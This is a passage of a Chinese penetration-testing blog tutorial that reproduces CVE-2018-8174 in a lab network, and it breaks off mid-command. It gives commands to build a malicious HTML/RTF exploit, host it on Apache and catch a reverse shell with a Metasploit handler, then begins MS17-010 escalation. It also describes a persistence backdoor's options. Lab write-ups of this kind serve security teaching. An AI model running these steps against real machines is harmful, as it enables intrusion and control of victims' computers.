---
layout:     post
title:      基于Windows VBScript Engine代码执行漏洞 (CVE-2018-8174)的内网渗透攻击
subtitle:   CVE-2018-8174漏洞复现|内网渗透|权限维持|脚本编程|痕迹清除
date:       2019-01-01
author:     Waldo
header-img: img/post-bg-自然风景19.jpg
catalog: true
tags:
    - web安全
---

[本文已在i春秋论坛发表](https://bbs.ichunqiu.com/thread-49407-1-1.html)

本文涉及的知识点: `CVE-2018-8174漏洞复现`、`内网渗透`、`权限维持`、`脚本编程`、`痕迹清除`

# CVE-2018-8174漏洞简介

CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门木马完全控制电脑。在基于Web的攻击情形中，攻击者能通过Internet Explorer利用此漏洞的特定网站，然后诱使用户查看该网站。攻击者还可以在承载IE呈现引擎的应用程序或Microsoft Office文档中嵌入标记为“安全初始化”的ActiveX控件。攻击者还可以利用受到破坏的网站和接受或托管用户提供的内容或广告的网站。这些网站可能包含可能利用此漏洞的特制内容。

# Persistence后门

Persistence是一款使用安装自启动方式的持久性后门程序，读者可以利用	它创建注册和文件。
参数解释:
- A: 自动启动Payload程序 
- S: 系统启动时自动加载
- U: 用户登录时自动启动
- X: 开机时自动加载
- i: 回连的时间间隔
- P: 监听反向连接端口号
- r: 目标机器IP地址

# 环境搭建
## 拓扑图
![](https://upload-images.jianshu.io/upload_images/7216746-5d1786d67c62853c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## Win server 2008 对Windows 7开启1433端口

 1. 选择“打开或者关闭Windows防火墙”把防火墙打开，然后选择“高级设置”，选择“创建规则”来指定端口。

2. 在“入站规则”里选择刚才创建的规则，名称是“1433”，如下图所示
![](https://upload-images.jianshu.io/upload_images/7216746-25f2d0aab494508e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

3. 在属性对话框中，选择“远程IP地址”时，使用Windows7 的IP地址：172.20.10.177，配置完成后，Win server 2008 对Windows7成功开启1433端口
![](https://upload-images.jianshu.io/upload_images/7216746-df8043e6bfda6032.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

# 内网攻击过程
## 1号机获得2号机的权限
### 利用CVE-2018-8174漏洞获取2号机(Windows 7)权限，添加攻击者用户

1. 从github上克隆CVE-2018-8174的EXP到Kali Linux    
    `git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git`
![](https://upload-images.jianshu.io/upload_images/7216746-131c2e12cbfa38ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

2. 生成恶意html和rtf文件
`cd CVE-2018-8174_EXP/`

`python CVE-2018-8174.py -u http://192.168.114.130/exploit.html -o exploit.rtf -i 192.168.114.130 -p 4444`
![](https://upload-images.jianshu.io/upload_images/7216746-35e332af8c9080c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

3. 将恶意html文件移动到网站根目录，启动apache2服务

`cp exploit.html /var/www/html/`
`service apache2 start`
![](https://upload-images.jianshu.io/upload_images/7216746-5fb45bfeb3543718.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

4. 新打开一个终端，生成MSF监听

```
msfconsole -x "use exploit/multi/handler; set PAYLOAD Windows/shell/reverse_tcp; set LHOST 192.168.114.130; set lport 4444; run"
```
![](https://upload-images.jianshu.io/upload_images/7216746-b1b7f72a33457f3b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

5. 受害者点击恶意链接

![](https://upload-images.jianshu.io/upload_images/7216746-e62e2ad770109a48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

6. 在kali里接收到了shell，可在meterpreter中管理shell
发现非管理员权限

![接收到反弹的shell](https://upload-images.jianshu.io/upload_images/7216746-70ec2bdd1c77ec7b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![非管理员权限](https://upload-images.jianshu.io/upload_images/7216746-39fe21067ffca550.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

7. 使用MS17-010模块进行提权
`use auxiliary/scanner/smb/smb_ms17_010`
![使用ms17-010模块](https://upload-images.jianshu.io/upload_images/7216746-d224b2f1691e6fa8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

在运行该模块之前，需要设置相关选项，我们使用show options查看配	置信息

![show options](https://upload-images.jianshu.io/upload_images/7216746-66dbea9e18331a0f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

8. 需要设置目标地址，设置命令：`set RHOSTS